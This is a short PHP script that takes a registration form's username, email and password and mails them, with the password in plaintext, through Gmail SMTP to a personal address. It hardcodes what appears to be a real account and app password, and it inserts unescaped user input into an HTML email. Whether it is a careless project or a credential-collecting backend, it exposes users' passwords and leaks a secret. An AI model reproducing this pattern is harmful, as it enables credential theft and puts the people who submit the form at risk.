<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';

// Get the form data
$nom_utilisateur = $_POST['nom_utilisateur'];
$email_utilisateur = $_POST['email_utilisateur'];
$mot_de_passe = $_POST['mot_de_passe'];

// Create a new PHPMailer instance
$mail = new PHPMailer(true);

try {
    // Server settings
    $mail->SMTPDebug = 0;                      // Enable verbose debug output
    $mail->isSMTP();                                            // Send using SMTP
    $mail->Host       = 'smtp.gmail.com';                     // Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
    $mail->Username   = 'wassimosbenfraj@gmail.com';                     // SMTP username
    $mail->Password   = 'skawxctlbjwezlyg';                               // SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
    $mail->Port       = 587;                                    // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

    // Recipients
    $mail->setFrom('wassimosbenfraj@gmail.com', 'Mailer');
    $mail->addAddress('wassimosbenfraj@gmail.com', 'Wassim Ben Fraj');     // Add a recipient

    // Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = 'New user registration';
    $mail->Body    = 'Nom d\'utilisateur: ' . $nom_utilisateur . '<br>Email utilisateur: ' . $email_utilisateur . '<br>Mot de passe: ' . $mot_de_passe;

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
